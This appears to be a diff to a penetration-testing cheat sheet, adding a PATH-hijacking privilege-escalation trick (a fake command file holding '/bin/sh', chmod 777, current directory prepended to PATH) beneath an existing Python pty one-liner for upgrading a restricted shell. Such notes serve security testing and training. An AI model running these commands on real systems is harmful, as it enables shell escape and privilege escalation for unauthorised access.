@@ -5,3 +5,8 @@ xxxxxx
 
 # Get no limited shell
 python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Change execution preference of command
+echo "/bin/sh" > <command>      
+chmod 777 <command>
+export PATH=.:$PATH
